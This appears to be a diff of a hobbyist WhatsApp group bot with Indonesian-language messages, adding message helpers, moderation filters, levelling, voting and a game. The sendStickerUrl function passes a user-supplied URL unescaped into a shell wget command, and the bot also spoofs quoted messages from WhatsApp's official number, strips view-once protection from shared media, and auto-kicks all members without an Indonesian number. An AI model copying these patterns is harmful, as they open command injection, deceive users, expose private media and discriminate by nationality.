+const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
+kma = vid1
+mhan = await xdev.prepareMessage(from, kma, video)
+locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
+ buttonMessages = {
+videoMessage: locmhan.message.videoMessage,
+contentText: text1,
+footerText: desc1,
+buttons: but,
+headerType: 5
+}
+xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
+}
+
+//Button Location
+const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
+kma = gam1
+mhan = await xdev.prepareMessage(id, {jpegThumbnail: kma}, MessageType.location)
+locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
+buttonMessages = {
+locationMessage: locmhan.message.locationMessage,
+contentText: text1,
+footerText: desc1,
+buttons: but,
+headerType: 'LOCATION',
+}
+xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
+}
+					
+					
+//Button document
+const Sendbutdocument = async(id, text1, desc1, gam1, but = [], options = {}) => {	
+
+if(docType === "pptx"){
+var AppType = "application/vnd.openxmlformats-officedocument.presentationml.presentation"
+} else if(docType === "xlsx"){
+var AppType = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
+} else if(docType === "zip"){
+var AppType = "application/zip"
+} else if(docType === "pdf"){
+var AppType = "application/pdf"
+} else if(docType === "docx"){
+var AppType = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
+}
+
+xdev.sendMessage(id, { 
+contentText: text1, 
+footerText: desc1,
+buttons: but, 
+"headerType": "DOCUMENT", 
+"documentMessage": { 
+"url": "https://mmg.whatsapp.net/d/f/Ano5cGYOFQnC51uJaqGBWiCrSJH1aDCi8-YPQMMb1N1y.enc", 
+"mimetype": AppType, 
+"title": "Footer text", 
+"fileSha256": "8Xfe3NQDhjwVjR54tkkShLDGrIFKR9QT5EsthPyxDCI=", 
+"fileLength": 999999999999, 
+"pageCount": 100, 
+"mediaKey": "XWv4hcnpGY51qEVSO9+e+q6LYqPR3DbtT4iqS9yKhkI=", 
+"fileName": namaDocument, 
+"fileEncSha256": "NI9ykWUcXKquea4BmH7GgzhMb3pAeqqwE+MTFbH/Wk8=", 
+"directPath": "/v/t62.7119-24/35160407_568282564396101_3119299043264875885_n.enc?ccb=11-4&oh=d43befa9a76b69d757877c3d430a0752&oe=61915CEC", 
+"mediaKeyTimestamp": "1634472176", 
+"jpegThumbnail": gam1}}, 
+MessageType.buttonsMessage, options)
+}
+ 
+//Katalog menu
+const sendKatalog = async (deskripsi ) => {   
+hmm4 = fs.readFileSync('./stik/thumb.jpeg')
+imeu =   await xdev.prepareMessage('0@s.whatsapp.net', hmm4, image, { thumbnail : fs.readFileSync(`./stik/fake.jpeg`)}), 
+imeg = imeu.message.imageMessage
+res =   xdev.prepareMessageFromContent(from, {
+'productMessage': {
+'product': {
+'productImage': imeg,
+'productId': 'IDR',
+'title': fake,
+'description': deskripsi,
+'retailerId': copyright,
+'itemCount': jumlahTroli,
+'priceAmount1000': '1000',
+'descriptionCount': 1,
+'productImageCount': '1'
+},
+'businessOwnerJid': `${nomerOwner}@s.whatsapp.net`        
+}
+}, {
+contextInfo: forward,
+quoted: setQuoted
+ }), 
+ xdev.relayWAMessage(res)         
+}
+
+//Troli menu
+const sendTroli = async (deskripsi ) => {
+var sendnih = xdev.prepareMessageFromContent(from, {
+'orderMessage': {
+'orderId': '0@s.whatsapp.net',
+'thumbnail': fs.readFileSync(`./stik/fake.jpeg`),
+'itemCount': jumlahTroli,
+'status': 1,
+'surface': 1,
+'message':deskripsi,
+'orderTitle': fake,
+'sellerJid': `0@s.whatsapp.net`,
+'token': 'notoken',
+}
+}, {
+'quoted': setQuoted,
+'contextInfo': forward,
+});
+xdev.relayWAMessage(sendnih)    
+}
+
+//SendBc
+const sendBc = async(id, text1, desc1, gam1, but = [], options = {}) => {	
+if(setBc === "document") {
+Sendbutdocument(id, text1,desc1,gam1, but, options)
+ } else  if(setBc === "lokasi") {  
+sendButLocation(id, text1,desc1,fs.readFileSync('./stik/fake.jpeg'), but, options)
+} else if(setBc === "troli") {
+sendButMessage(id, text1, desc1, but)
+} else {
+xdev.sendMessage(id, `${text1}\n\n${desc1}`, text)
+}
+}
+
+
+//******************* 》FAKE MESSAGE《 ********************\\
+const sendvn = (teks) => {
+xdev.sendMessage(from, teks, audio, {mimetype: 'audio/mp4', thumbnail: fs.readFileSync('./stik/fake.jpeg'), quoted: dev, ptt: true})
+}     
+const reply = (teks) => {
+xdev.sendMessage(from, teks, text, { quoted: dev });
+};
+const sendMess = (teks) => {
+xdev.sendMessage(from, teks, text)
+}
+const mentions = (teks, memberr, id) => {
+(id == null || id == undefined || id == false) ? xdev.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": memberr, forwardingScore: totalForward, isForwarded: forwarding } })
+}
+const costum = (pesan) => {
+if (Loading){
+xdev.sendMessage(from, pesan, text, {quoted: { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `*${fake}*`, 'jpegThumbnail': fs.readFileSync('./stik/fake.jpeg')}}}})
+} 
+}
+const sendSticker = (pesan) => {
+xdev.sendMessage(from, pesan, sticker, {quoted: dev, contextInfo: forward})
+}
+const sendSticker1 = (pesan) => {
+xdev.sendMessage(from, pesan, sticker)
+}
+const math = (teks) => {
+return Math.floor(teks)
+}  
+const sendVideo = (teks) => {
+xdev.sendMessage(from, teks, video, { quoted: dev });
+};       
+const sendGif = (teks, teksnya) => {
+xdev.sendMessage(from, teks, video, { caption: teksnya, mimetype: Mimetype.gif, quoted: dev });
+};        
+const sendAudio = (file) => {
+xdev.sendMessage(from, file, audio, { mimetype: 'audio/mp4', quoted: dev });
+};   
+
+
+ 
+//onlyOwner
+const onlyOwner = async() =>{
+if(autovn){
+sendvn(gakmau)
+}else if(autosticker){
+sendSticker(gaboleh)
+} else if(typing){
+setReply(mess.only.ownerB)
+}else {
+setReply(mess.only.ownerB)
+}
+}
+ 
+ 
+//******************* 》FUNCTION《 ********************\\
+
+const sendStickerUrl = async(to, url) => {
+console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
+var names = getRandom('.webp')
+var namea = getRandom('.png')
+var download = function (uri, filename, callback) {
+request.head(uri, function (err, res, body) {
+request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
+mime = res.headers['content-type']
+});
+};
+download(url, namea, async function () {
+let filess = namea
+let asw = names
+require('./lib/exif.js')
+if(mime === "image/gif"){
+ranp = getRandom('.gif')
+rano = getRandom('.webp')
+exec(`wget ${url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
+fs.unlinkSync(ranp)
+if (err) return setReply(`${err}`)
+xdev.sendMessage(to, fs.readFileSync(rano), sticker, {quoted: dev})
+fs.unlinkSync(rano)
+})
+} else {
+
+exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
+exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
+let media = fs.readFileSync(asw)
+xdev.sendMessage(to, media, sticker, dev)
+console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
+fs.unlinkSync(names)
+fs.unlinkSync(namea)
+});
+});
+
+}
+});
+}
+         
+
+           
+const sendMediaURL = async(to, url, text="", mids=[]) =>{
+if(url == undefined) return setReply("Url undefined")
+if(mids.length > 0){
+text = normalizeMention(to, text, mids)
+}
+const fn = Date.now() / 10000;
+const filename = fn.toString()
+let mime = ""
+var download = function (uri, filename, callback) {
+request.head(uri, function (err, res, body) {
+mime = res.headers['content-type']
+request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
+});
+};
+download(url, filename, async function () {
+console.log('done');
+let media = fs.readFileSync(filename)
+let type = mime.split("/")[0]+"Message"
+if(mime === "image/gif"){
+ type = MessageType.video
+ mime = Mimetype.gif
+} else if(mime === "application/pdf"){
+ type = MessageType.document
+ mime = Mimetype.pdf
+} else if(mime === "application/zip"){
+ type = MessageType.document
+ mime = "application/zip"
+} else if(mime.split("/")[0] === "audio"){
+ type = MessageType.audio
+ mime = Mimetype.mp4Audio        
+} else {
+ setReply("Mimetype tidak di temukan")
+}
+xdev.sendMessage(to, media, type, { quoted: dev, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
+fs.unlinkSync(filename)
+});
+}
+            
+const sendFileFromUrl = async(link, type, options) => {         
+hasil = await getBuffer(link)
+await xdev.sendMessage(from, hasil, type, options).catch(e => {
+fetch(link).then((hasil) => {
+xdev.sendMessage(from, hasil, type, options).catch(e => {
+xdev.sendMessage(from, { url : link }, type, options).catch(e => {
+setReply("_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_")
+console.log(e)
+})
+})
+})
+})
+}
+
+            
+
+         
+//******************* 》SECURITY《 ********************\\
+            
+//ANTI VIO 
+if (!dev.key.fromMe && isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {       	
+setReply(`@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`);
+var msg = { ...dev };
+msg.dev = dev.message.viewOnceMessage.message;
+msg.dev[Object.keys(msg.dev)[0]].viewOnce = false;
+xdev.copyNForward(m.chat, msg);
+}
+ 
+//ANTI HIDETAG
+if (isGroup && isAntihidetag && m.message[m.mtype]?.contextInfo?.mentionedJid?.length == groupMembers.length) {    
+if (isGroupAdmins) return setReply('Admin bebas pakai hidetag dong :v')
+console.log( color("[ANTI-HIDETAG]", "red"), color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "cyan") );
+setReply(`Maaf, Botz akan mengeluarkan kamu karena kamu terdetaksi mengirim pesan hidetag`);
+setTimeout(() => {
+xdev.groupRemove(from, [sender]);
+},3000)
+}
+       
+//ANTI TROLI 
+if (m.message  && !m.key.fromMe && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
+if (antibugtroli === false) return
+if(jeda === true) return
+jeda = true
+m.reply('Troli Detected\n\n' + require('util').format(m.key))
+await xdev.modifyChat(m.chat, 'delete', {
+includeStarred: false
+})
+setTimeout( () => {
+jeda = false
+},2000)
+}
+
+//ANTI BADWORD 
+if (isGroup && Toxic && !isOwner && !isGroupAdmins && !dev.key.fromMe){ 
+if (badword.includes(messagesC)) {
+if (isCountKasar(sender, senbadword)){
+if (!isBotGroupAdmins) return setReply(`Kamu beruntung karena bot bukan admin`)
+setReply(`*「 ANTI BADWORD 」*\n\nSepertinya kamu sudah berkata kasar lebih dari 5x, maaf kamu akan di kick`)
+setTimeout( () => {
+xdev.groupRemove(from, [sender])
+},1000)
+delCountKasar(sender, senbadword)
+} else {
+addCountKasar(sender, senbadword)
+setReply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick oleh botz`)
+}
+}
+}
+           
+//ANTI VIRUS
+if (isGroup && AntiVirtex && budy.length > 20000) {
+if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
+console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
+await xdev.modifyChat(from, ChatModification.delete)                 
+await xdev.sendMessage(from, antivirus(pushname,groupName), text)
+if (!isBotGroupAdmins) return 
+if(isOwner) return 
+await xdev.groupRemove(from, [sender])
+await xdev.groupSettingChange(from, GroupSettingChange.messageSend, true)
+await sendMess("Group Telah Di Tutup")
+await xdev.sendMessage(`${nomerOwner}@s.whatsapp.net`, `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`, text)
+ }
+ 
+ 
+//Auto clear jika terdapat pesan yg tidak dapat dilihat oleh whatsapp web
+if(dev.messageStubType){
+if (dev.messageStubType === 68) {
+console.log(color("Auto clear chat, virtex terdeteksi"))
+await xdev.clearMessage(dev.key)
+}
+} 
+  
+ //ANTI LINK GROUP
+if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
+if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
+linkgc = await xdev.groupInviteCode(from)
+if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
+if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
+var kic = `${sender.split("@")[0]}@s.whatsapp.net`
+setReply(` *「 LINK GROUP DETECTED 」*\nKamu mengirimkan link group, maaf kamu di kick dari grup :(`)
+setTimeout(() => {
+xdev.groupRemove(from, [kic]).catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
+}, 2000)
+}   
+
+ //ANTI LINK 
+if (isGroup && isAntiLink){
+if (budy.includes(`https:`)) { 
+if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
+linkgc = await xdev.groupInviteCode(from)
+if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
+if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
+var kic = `${sender.split("@")[0]}@s.whatsapp.net`
+setReply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
+setTimeout(() => {
+xdev.groupRemove(from, [kic]).catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
+}, 2000)
+}
+}
+
+ //ANTI ASING/BULE OK
+if (isGroup && isBotGroupAdmins && isKickarea && !dev.key.fromMe) {    
+member = await groupMembers.map(u => u.jid)
+for ( let i = 0; i <member.length; i++){  
+if (member[i].slice(0,2) !== "62" ){     	
+let users = await groupMembers.find(u => u.jid == member[i]) 
+if (!users.groupAdmins ){
+await xdev.groupRemove(from, [member[i]])     
+}
+}
+}
+}  
+    
+
+//******************* 》FUNCTION OTHERS《 ********************\\
+
+// MUTE
+if (checkDataId ("mute", from, DataId)  ){
+if (!isOwner && !theOwner) return
+}
+    
+//AFK FUNCTION
+cekafk(afk)
+if (!dev.key.remoteJid.endsWith('@g.us') && offline){
+if (!dev.key.fromMe && !isOwner){
+if (isAfk(dev.key.remoteJid)) return
+addafk(dev.key.remoteJid)
+heheh = ms(Date.now() - waktu) 
+xdev.sendMessage(dev.key.remoteJid,`@${nomerOwner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${nomerOwner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
+}
+}   
+if (dev.key.remoteJid.endsWith('@g.us') && offline) {
+if (!dev.key.fromMe && !isOwner){
+if (dev.message.extendedTextMessage != undefined){
+if (dev.message.extendedTextMessage.contextInfo != undefined){
+if (dev.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
+for (let ment of dev.message.extendedTextMessage.contextInfo.mentionedJid) {
+if (ment === `${nomerOwner}@s.whatsapp.net`){
+if (isAfk(dev.key.remoteJid)) return
+addafk(dev.key.remoteJid)
+heheh = ms(Date.now() - waktu)
+xdev.sendMessage(dev.key.remoteJid,`@${nomerOwner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${nomerOwner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
+}
+}
+}
+}
+}
+}
+}
+  
+   
+//BOT FUNCTION
+const oawalah =['iya kak ?','Ada apa kak ?','Bot aktif kak','Aku bukan bot kak, aku ini hooman','Kumaha atuh kak ?','Kunaon kak ?','oy ?','ya ?','Kenapa panggil aku','Ada apa kak kok panggil aku','Naon siah kehed manggil manggil']
+const hayuk = oawalah[Math.floor(Math.random() * oawalah.length)]
+  
+//VOTING FUNCTION
+if(isGroup && !isVote) {
+if (budy.toLowerCase() === 'vote'){
+let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
+let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
+let fil = vote.map(v => v.participant)
+let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
+if(fil.includes(id_vote)) {
+return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
+} else {
+vote.push({
+participant: id_vote,
+voting: '✅'
+})
+fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
+let _p = []
+let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
+for(let i = 0; i < vote.length; i++) {
+_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
+_p.push(vote[i].participant)
+ }  
+_p.push(_votes[0].votes)
+mentions(_vote,_p,true)   
+}
+} else if (budy.toLowerCase() === 'devote'){
+const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
+let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
+let fil = vote.map(v => v.participant)
+let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
+if(fil.includes(id_vote)) {
+return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
+} else {
+vote.push({
+participant: id_vote,
+voting: '❌'
+})
+fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
+let _p = []
+let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
+for(let i = 0; i < vote.length; i++) {
+_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
+_p.push(vote[i].participant)
+}  
+_p.push(_votes[0].votes)
+mentions(_vote,_p,true)   
+}
+}
+}	
+ 
+//PUBLIC
+if (publik === false) {
+if (!dev.key.fromMe && !isOwner && !theOwner) return
+}
+
+//BAN CHAT
+if (isBanchat){
+if (!isOwner && !theOwner && !isGroupAdmins) return
+}
+
+if(cekBannedUser(sender, ban) && !isOwner) return
+if(cekSpam("Case",senderNumber, AntiSpam)) return
+SpamExpired(senderNumber, "NotCase", AntiSpam)
+SpamExpired(senderNumber, "Case", AntiSpam)
+expiredClaim(_claim)
+       
+//ANTI SPAM PRIVATE CHAT
+if (isCmd && msgFilter.isFiltered(from) && !isGroup && !dev.key.fromMe && !isOwner) {
+console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`), 'dari', color(pushname))
+addSpam("Case",senderNumber, "30s", AntiSpam)
+console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`Berhasil banned ${pushname} sementara`))
+if(autovn && !nopref) {
+return sendvn(nospam)
+} else if(!autovn && !nopref){
+return setReply(textspam)
+}
+}
+//ANTI SPAM GROUP CHAT     
+if (isCmd && msgFilter.isFiltered(from) && isGroup && !dev.key.fromMe && !isOwner) {
+console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
+addSpam("Case",senderNumber, "30s", AntiSpam)
+console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`Berhasil banned user sementara`), 'from', color(pushname))
+if(autovn && !nopref) {
+return sendvn(nospam)
+} else if(!autovn && !nopref){
+return setReply(textspam)
+}
+}
+if (isCmd && !isOwner) msgFilter.addFilter(from)
+
+   
+//------------------ 》AUTO SYSTEM《 ------------------\\
+
+//AUTO BIO
+if(autobio){ 
+runoy = process.uptime() 
+xdev.setStatus(`${fake} | ⏰ ${kyun(runoy)} | 🔋 ${baterai.battery}`).catch((_)=>_);
+}
+   
+//AUTO REGISTER && !dev.key.fromMe && !isOwner  && isCmd
+if (!isHit ){ 
+addUserId(gcount, limitCount, calender, pushname, senderNumber, user)
+}
+   
+//Auto Hit 
+if(command){
+AddHit(senderNumber, user)
+cmdAdd("run", "1d", hitnya)
+}
+expiredCmd(hitnya)
+const thisHit = `${getHit("run", hitnya)}`
+
+
+
+
+//--------------------------AREA EXP USER------------------------\\
+
+
+//Exp User
+if ( isHit && !itsMe && !isCmd ||  isHit && !itsMe && command ) {
+
+//Auto clear chat
+if(AutoClearChat &&  !checkAutoClear("AutoClearChat", hitnya)){
+console.log(`add autoclear chat`)
+addAutoClear("AutoClearChat", "1d", hitnya) 
+}
+//Auto add Dssboard
+for (let dash of features){
+if(command == dash){
+addDb(command, Dashboard) 
+}
+}       
+
+
+try {
+if (userLevel === undefined && userId === undefined) {
+addUserId(gcount, limitCount, calender, pushname, senderNumber, user)
+}
+
+if (autoLevel){
+addLevelingXp(senderNumber, amountExp, user)
+}
+if (autoLevel && userExp >= requiredExp || autoLevel && userExp == requiredExp) {
+addLevelingLevel(senderNumber, 1, user)
+resetLevelingXp(senderNumber, userExp, user)
+
+
+anune =`${userLevel}000`
+susu = randomNomor(math(anune))
+addBalance(senderNumber, susu, user)
+
+
+//Hadiah Limit
+if(userLevel >= 25){
+anuitu =`${userLevel}`
+ sapi = randomNomor(math(anuitu))
+giveLimit(senderNumber, sapi, user)
+} else {
+sapi = "0"
+}
+
+
+//Hadiah Premium
+if(userLevel >= 50){
+nana = randomNomor(24) + "h"
+_prem.addPremiumUser (sender, nana, premium)         
+} else {
+	nana = "0"
+}
+
+levelnih = userLevel + 1
+
+teks = `*]───「 LEVEL UP 」───[*
+
+Selamat, kamu telah naik ke level ${levelnih}
+Pangkatmu saat ini adalah 「 *${userLeveling(levelnih)}* 」
+Dan kamu telah mendapatkan
+💳 Saldo  : Rp ${susu}
+📉 Limit : ${sapi}
+🎫 Premium : ${nana.split("h")[0]} Jam`
+but = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },{ buttonId: `${prefix}shop`, buttonText: { displayText: `sʜᴏᴘ` }, type: 1 } ];         
+await setReply(teks)
+}
+} catch (err) {
+console.error(err)
+}
+}
+
+if(AutoClearChat){
+autoClearChat( totalchat, xdev, ChatModification, hitnya)
+}
+
+
+//-----------------------------------------AKHIR BATAS EXP USER-->
+
+
+
+
+
+//AUTO TYPING & RECORDING
+if (isCmd && autovn){
+xdev.updatePresence(from, Presence.recording)
+} else if (isCmd && typing){
+xdev.updatePresence(from, Presence.composing)
+} else {
+xdev.updatePresence(from, Presence.avaible)
+}
+
+//AUTO BLOCK CMD
+for (let i = 0; i < listcmdblock.length ; i++) {
+if (command === listcmdblock[i].cmd ){
+if(autoblockcmd) {
+return setReply(mess.block.Bsystem)
+} else{
+return setReply(mess.block.Bowner)
+}
+}
+}
+
+//AUTO RESPON
+for (let i = 0; i < commandsDB.length ; i++) {
+if (budy == commandsDB[i].pesan) {
+xdev.sendMessage(from, commandsDB[i].balasan, text, {quoted: dev})
+}
+}
+    
+    
+//AUTO RESPON STICKER
+if (setiker.includes(messagesC)){
+if(isExtream) return
+namastc = messagesC
+buffer = fs.readFileSync(`./temp/stick/${namastc}.webp`)
+xdev.sendMessage(from, buffer, sticker, {quoted:dev })
+}
+	
+//AUTO RESPON VN
+for (let anju of audionye){
+if (budy === anju){
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return sendSticker(spam2)
+buffer = fs.readFileSync(`./temp/audio/${anju}.mp3`)
+xdev.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 audio 」 ${anju}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}, ptt: true, contextInfo: forward})
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+}
+}
+	   
+//AKSES PRIVATE 
+if (!isGroup && !isOwner && !isPremium && isCmd && chatBot === true) { 
+if(autovn) {
+sendvn(gakmau)
+} else {
+setReply(teksChat)
+}
+}
+
+//Suit PvP Copas dari Dika Ardnt awokawok
+this.suit = this.suit ? this.suit : {}
+let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
+if (roof) {
+let win = ''
+let tie = false
+
+if (m.sender == roof.p2 && budy.includes("olak") && m.isGroup && roof.status == 'wait') {
+mentions(`@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`,[roof.p2], true)
+delete this.suit[roof.id]
+}
+
+if (m.sender == roof.p2 && budy.includes("erima") && m.isGroup && roof.status == 'wait') {
+roof.status = 'play'
+roof.asal = from
+clearTimeout(roof.waktu)
+//delete roof[roof.id].waktu
+teks = `Silahkan pilih \n\nBatu\nKertas\nGunting`
+let mok = [{"buttonId": "batu","buttonText": {"displayText": `ʙᴀᴛᴜ`},"type": "RESPONSE"},
+                    {"buttonId": "gunting","buttonText": {"displayText": `ɢᴜᴛɪɴɢ`},"type": "RESPONSE"},
+                     {"buttonId": "kertas","buttonText": {"displayText": `ᴋᴇʀᴛᴀs`},"type": "RESPONSE"}
+                    ]
+                    
+mentions(`Suit telah dikirimkan ke chat
+
+@${roof.p.split`@`[0]} dan 
+@${roof.p2.split`@`[0]}
+
+Silahkan pilih suit di chat masing"
+klik wa.me/${botNumber.split`@`[0]}`, [roof.p, roof.p2], true)
+
+if (!roof.pilih) sendButMessage (roof.p, teks, copyright, mok) 
+if (!roof.pilih2) sendButMessage (roof.p2, teks, copyright, mok) 
+roof.waktu_milih = setTimeout(() => {
+if (!roof.pilih && !roof.pilih2) mentions( `Kedua pemain tidak niat main,\nSuit dibatalkan`, [roof.p, roof.p2], true)
+else if (!roof.pilih || !roof.pilih2) {
+win = !roof.pilih ? roof.p2 : roof.p
+mentions(`@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, [(roof.pilih ? roof.p2 : roof.p)], true)
+}
+delete this.suit[roof.id]
+//return !0
+}, roof.timeout)
+}
+let jwb = m.sender == roof.p
+let jwb2 = m.sender == roof.p2
+let g = /gunting/i
+let b = /batu/i
+let k = /kertas/i
+let reg = /^(gunting|batu|kertas)/i 
+
+
+if (jwb && reg.test(m.text)  && !roof.pilih && !m.isGroup) {
+roof.pilih = reg.exec(m.text.toLowerCase())[0]
+roof.text = m.text
+m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
+if (!roof.pilih2) xdev.sendMessage(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', text)
+}
+
+if (jwb2 && reg.test(m.text)   && !roof.pilih2 && !m.isGroup) {
+roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
+roof.text2 = m.text
+m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
+if (!roof.pilih) xdev.sendMessage(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', text)
+}
+
+
+
+let stage = roof.pilih
+let stage2 = roof.pilih2
+if (roof.pilih && roof.pilih2) {
+clearTimeout(roof.waktu_milih)
+if (b.test(stage) && g.test(stage2)) win = roof.p
+else if (b.test(stage) && k.test(stage2)) win = roof.p2
+else if (g.test(stage) && k.test(stage2)) win = roof.p
+else if (g.test(stage) && b.test(stage2)) win = roof.p2
+else if (k.test(stage) && b.test(stage2)) win = roof.p
+else if (k.test(stage) && g.test(stage2)) win = roof.p2
+else if (stage == stage2) tie = true
+xdev.sendMessage(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
+
+@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
+@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
+`.trim(), text, { contextInfo: { mentionedJid: [roof.p, roof.p2] }})
+delete this.suit[roof.id]
+}
+}
+	
+//Anonymouse Function, meneruskan pesan ke users
+this.anonymous = this.anonymous ? this.anonymous : {}
+let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
+if (room && !isCmd && !isGroup) {
+let other = [room.a, room.b].find(user => user !== m.sender)
+m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
+contextInfo: {...m.msg.contextInfo,forwardingScore: 0, isForwarded: false, participant: other }} : {})
+}
+
+//DOWNLOAD MP4
+const downloadMp4 = async (Link ) => {
+mp4File = getRandom('.mp4') 
+nana = ytdl(Link)
+.pipe(fs.createWriteStream(mp4File))
+.on("finish", async () => {    
